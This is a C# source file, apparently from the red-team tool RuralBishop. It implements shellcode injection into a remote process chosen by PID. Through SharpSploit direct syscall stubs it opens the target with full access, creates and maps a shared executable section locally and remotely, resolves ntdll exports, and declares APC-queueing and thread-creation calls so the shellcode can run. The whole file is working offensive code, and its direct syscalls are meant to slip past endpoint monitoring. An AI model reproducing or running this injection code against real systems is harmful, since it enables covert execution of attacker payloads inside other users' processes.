using SharpSploit.Execution.DynamicInvoke;

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace RuralBishop
{
    public class QueensGambit
    {
        #region Structs

        [StructLayout(LayoutKind.Sequential)]
        public struct PROC_VALIDATION
        {
            public Boolean isvalid;
            public String sName;
            public IntPtr hProc;
            public IntPtr pNtllBase;
            public Boolean isWow64;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SC_DATA
        {
            public UInt32 iSize;
            public byte[] bScData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ANSI_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class THREAD_BASIC_INFORMATION
        {
            public UInt32 ExitStatus;
            public IntPtr TebBaseAddress;
            public CLIENT_ID ClientId;
            public UIntPtr AffinityMask;
            public int Priority;
            public int BasePriority;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public ulong Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public ulong Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        #endregion

        #region Delegates

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtOpenProcess(
            ref IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtQueryInformationProcess(
            IntPtr processHandle,
            UInt32 processInformationClass,
            ref ulong processInformation,
            int processInformationLength,
            ref UInt32 returnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtUnmapViewOfSection(
            IntPtr ProcessHandle,
            IntPtr BaseAddress);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtQueueApcThread(
             IntPtr ThreadHandle,
             IntPtr ApcRoutine,
             IntPtr ApcArgument1,
             IntPtr ApcArgument2,
             IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtCreateThreadEx(
            ref IntPtr hThread,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            UInt32 StackZeroBits,
            UInt32 SizeOfStackCommit,
            UInt32 SizeOfStackReserve,
            IntPtr lpBytesBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)]
            string SourceString);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 RtlUnicodeStringToAnsiString(
            ref ANSI_STRING DestinationString,
            ref UNICODE_STRING SourceString,
            bool AllocateDestinationString);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 LdrGetProcedureAddress(
            IntPtr hModule,
            ref ANSI_STRING ModName,
            UInt32 Ordinal,
            ref IntPtr FunctionAddress);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAlertResumeThread(
            IntPtr ThreadHandle,
            ref UInt32 PreviousSuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtQueryInformationThread(
            IntPtr ThreadHandle,
            int ThreadInformationClass,
            IntPtr ThreadInformation,
            int ThreadInformationLength,
            ref int ReturnLength);

        #endregion

        #region Helpers

        public static void GetHelp()
        {
            Console.WriteLine("[!] Missing arguments..\n");
            Console.WriteLine("    -p (--Path)        Full path to the shellcode binary file");
            Console.WriteLine("    -i (--Inject)      PID to inject");
            Console.WriteLine("    -c (--Clean)       Optional, wait for payload to exit and clean up");
        }

        #endregion

        #region Banner

        public static void PrintBanner()
        {
            Console.WriteLine("   _O        _____             _          ");
            Console.WriteLine("  / //\\     | __  |_ _ ___ ___| |        ");
            Console.WriteLine(" {     }    |    -| | |  _| .'| |        ");
            Console.WriteLine("  \\___/     |__|__|___|_| |__,|_|        ");
            Console.WriteLine("  (___)                                  ");
            Console.WriteLine("   |_|          _____ _     _            ");
            Console.WriteLine("  /   \\        | __  |_|___| |_ ___ ___  ");
            Console.WriteLine(" (_____)       | __ -| |_ -|   | . | . | ");
            Console.WriteLine("(_______)      |_____|_|___|_|_|___|  _| ");
            Console.WriteLine("/_______\\                          |_|  ");
            Console.WriteLine("                  ~b33f~  ~rasta~      \n");
        }

        #endregion

        public static Boolean PathIsFile(String Path)
        {
            try
            {
                FileAttributes CheckAttrib = File.GetAttributes(Path);
                if ((CheckAttrib & FileAttributes.Directory) == FileAttributes.Directory)
                {
                    Console.WriteLine("[!] Please specify a file path not a folder path (-p|--Path)");
                    return false;
                }
            }
            catch
            {
                Console.WriteLine("[!] Invalid shellcode bin file path specified (-p|--Path)");
                return false;
            }
            return true;
        }

        public static IntPtr GetProcessHandle(Int32 ProcId)
        {
            IntPtr hProc = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID();
            ci.UniqueProcess = (IntPtr)ProcId;

            IntPtr pSysCall = Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess fSyscallNtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(NtOpenProcess));
            fSyscallNtOpenProcess(ref hProc, 0x1F0FFF, ref oa, ref ci);

            return hProc;
        }

        public static PROC_VALIDATION ValidateProc(Int32 ProcId)
        {
            PROC_VALIDATION Pv = new PROC_VALIDATION();

            try
            {
                Process Proc = Process.GetProcessById(ProcId);
                ProcessModuleCollection ProcModColl = Proc.Modules;
                foreach (ProcessModule Module in ProcModColl)
                {
                    if (Module.FileName.EndsWith("ntdll.dll"))
                    {
                        Pv.pNtllBase = Module.BaseAddress;
                        break;
                    }
                }
                Pv.isvalid = true;
                Pv.sName = Proc.ProcessName;
                Pv.hProc = GetProcessHandle(ProcId);
                ulong isWow64 = 0;
                uint RetLen = 0;

                IntPtr pSysCall = Generic.GetSyscallStub("NtQueryInformationProcess");
                NtQueryInformationProcess fSyscallNtQueryInformationProcess = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(NtQueryInformationProcess));
                fSyscallNtQueryInformationProcess(Pv.hProc, 26, ref isWow64, Marshal.SizeOf(isWow64), ref RetLen);

                if (isWow64 == 0)
                {
                    Pv.isWow64 = false;
                }
                else
                {
                    Pv.isWow64 = true;
                }
            }
            catch
            {
                Pv.isvalid = false;
            }

            return Pv;
        }

        public static SC_DATA ReadShellcode(String Path)
        {
            SC_DATA scd = new SC_DATA();
            try
            {
                scd.bScData = File.ReadAllBytes(Path);
                scd.iSize = (uint)scd.bScData.Length;
            }
            catch { }

            return scd;
        }

        public static SECT_DATA MapLocalSection(long ScSize)
        {
            SECT_DATA SectData = new SECT_DATA();

            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;

            IntPtr pSysCall = Generic.GetSyscallStub("NtCreateSection");
            NtCreateSection fSyscallNtCreateSection = (NtCreateSection)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(NtCreateSection));
            UInt32 CallResult = fSyscallNtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
                Console.WriteLine("    |-> Size: " + ScSize);
                SectData.hSection = hSection;
            }
            else
            {
                Console.WriteLine("[!] Failed to create section..");
                SectData.isvalid = false;
                return SectData;
            }

            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;

            pSysCall = Generic.GetSyscallStub("NtMapViewOfSection");
            NtMapViewOfSection fSyscallNtMapViewOfSection = (NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(NtMapViewOfSection));
            CallResult = fSyscallNtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
                SectData.pBase = pScBase;
            }
            else
            {
                Console.WriteLine("[!] Failed to map section locally..");
                SectData.isvalid = false;
                return SectData;
            }

            SectData.isvalid = true;
            return SectData;
        }

        public static SECT_DATA MapRemoteSection(IntPtr hProc, IntPtr hSection, long ScSize)
        {
            SECT_DATA SectData = new SECT_DATA();

            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            long MaxSize = ScSize;

            IntPtr pSysCall = Generic.GetSyscallStub("NtMapViewOfSection");
            NtMapViewOfSection fSyscallNtMapViewOfSection = (NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(NtMapViewOfSection));
            UInt32 CallResult = fSyscallNtMapViewOfSection(hSection, hProc, ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);

            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                Console.WriteLine("    |-> pRemoteBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
                SectData.pBase = pScBase;
            }
            else
            {
                Console.WriteLine("[!] Failed to map section in remote process..");
                SectData.isvalid = false;
                return SectData;
            }

            SectData.isvalid = true;
            return SectData;
        }

        public static IntPtr GetLocalExportOffset(String Module, String Export)
        {
            UNICODE_STRING uModuleName = new UNICODE_STRING();

            IntPtr pFunction = Generic.GetLibraryAddress(@"ntdll.dll", "RtlInitUnicodeString");
            RtlInitUnicodeString rtlInitUnicodeString = (RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(pFunction, typeof(RtlInitUnicodeString));
            rtlInitUnicodeString(ref uModuleName, Module);

            IntPtr hModule = Generic.GetPebLdrModuleEntry(Module);

            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to get " + Module + " handle..");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("    |-> LdrGetDllHandle OK");
            }

            UNICODE_STRING uFuncName = new UNICODE_STRING();
            rtlInitUnicodeString(ref uFuncName, Export);

            ANSI_STRING aFuncName = new ANSI_STRING();

            pFunction = Generic.GetLibraryAddress(@"ntdll.dll", "RtlUnicodeStringToAnsiString");
            RtlUnicodeStringToAnsiString rtlUnicodeStringToAnsiString = (RtlUnicodeStringToAnsiString)Marshal.GetDelegateForFunctionPointer(pFunction, typeof(RtlUnicodeStringToAnsiString));
            rtlUnicodeStringToAnsiString(ref aFuncName, ref uFuncName, true);

            IntPtr pExport = IntPtr.Zero;

            pFunction = Generic.GetLibraryAddress(@"ntdll.dll", "LdrGetProcedureAddress");
            LdrGetProcedureAddress ldrGetProcedureAddress = (LdrGetProcedureAddress)Marshal.GetDelegateForFunctionPointer(pFunction, typeof(LdrGetProcedureAddress));
            UInt32 CallResult = ldrGetProcedureAddress(hModule, ref aFuncName, 0, ref pExport);

            if (CallResult != 0 || pExport == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to get " + Export + " address..");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("    |-> " + Export + ": 0x" + String.Format("{0:X}", (pExport).ToInt64()));
            }

            IntPtr FuncOffset = (IntPtr)((Int64)pExport - (Int64)hModule);
            Console.WriteLine("    |-> Offset: 0x" + String.Format("{0:X}", (FuncOffset).ToInt64()));

            return FuncOffset;
        }

        public static THREAD_BASIC_INFORMATION GetThreadState(IntPtr hThread)
        {
            THREAD_BASIC_INFORMATION ts = new THREAD_BASIC_INFORMATION();
            IntPtr BuffPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ts));
            int RetLen = 0;

            IntPtr pSysCall = Generic.GetSyscallStub("NtQueryInformationThread");
            NtQueryInformationThread fSyscallNtQueryInformationThread = (NtQueryInformationThread)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(NtQueryInformationThread));
            UInt32 CallResult = fSyscallNtQueryInformationThread(hThread, 0, BuffPtr, Marshal.SizeOf(ts), ref RetLen);

            if (CallResult != 0)
            {
                Console.WriteLine("[!] Failed to query thread information..");
                return ts;
            }

            ts = (THREAD_BASIC_INFORMATION)Marshal.PtrToStructure(BuffPtr, typeof(THREAD_BASIC_INFORMATION));

            return ts;
        }
    }
}